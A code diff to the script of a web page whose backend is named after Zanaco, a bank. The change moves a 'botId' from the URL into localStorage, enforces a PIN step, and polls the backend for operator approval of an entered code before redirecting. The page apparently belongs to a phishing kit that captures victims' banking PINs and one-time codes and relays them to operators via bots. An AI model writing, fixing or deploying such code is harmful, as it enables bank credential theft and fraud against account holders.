@@ -46,19 +46,16 @@ button:disabled { background: #ccc; cursor: not-allowed; }
 <script>
 const BACKEND_URL = "https://zanaco-backend.onrender.com";
 
-// ------------------- BOT ROUTING ----------------
-const params = new URLSearchParams(window.location.search);
-const botId = params.get('botId');
-
+// ------------------- BOT ROUTING (FIXED) ----------------
+const botId = localStorage.getItem('botId');
 if (!botId) {
     alert("Invalid access link");
     throw new Error("botId missing");
 }
-localStorage.setItem('botId', botId);
 
 // Prevent skipping steps
 if (!localStorage.getItem('pin')) {
-    window.location.href = `pin.html?botId=${botId}`;
+    window.location.href = 'pin.html';
 }
 
 // ------------------- Code input logic -------------------
@@ -130,7 +127,7 @@ function startPolling() {
 
         if (data.approved === true) {
             clearInterval(pollInterval);
-            window.location.href = `success.html?botId=${botId}`;
+            window.location.href = 'success.html';
         } else if (data.approved === false) {
             clearInterval(pollInterval);
             attempts++;
